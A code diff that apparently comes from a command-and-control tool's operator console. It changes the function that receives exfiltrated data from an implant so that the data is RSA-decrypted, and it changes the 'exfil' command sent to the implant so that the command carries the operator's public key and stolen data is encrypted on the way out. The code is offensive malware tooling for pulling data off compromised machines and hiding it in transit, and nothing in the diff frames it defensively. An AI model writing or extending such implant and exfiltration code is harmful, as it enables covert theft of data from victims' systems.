@@ -32,9 +32,10 @@ def recieve_exfil():
         #Recieves and prints the data
         while True:
             #encrypted
-            data = connection.recv(500)
+            data = connection.recv(900)
             if data:
-                content = data.decode("utf-8")
+                message = rsa.decrypt(data, privkey)
+                content = message.decode('utf8')
                 lines = content.split("\n")
                 for l in lines:
                     if(l != ""):
@@ -95,7 +96,8 @@ while(True):
                 print("Exfil initiated")
                 #Send command to exfiltrate
                 #encrypt command, send with public key
-                send_implant('2e')
+                #"comm;n;e"
+                send_implant('2e' + ';' + str(pubkey.n) + ';' + str(pubkey.e))
                 #Recieve the exfil and decrypt the response
                 recieve_exfil()
             
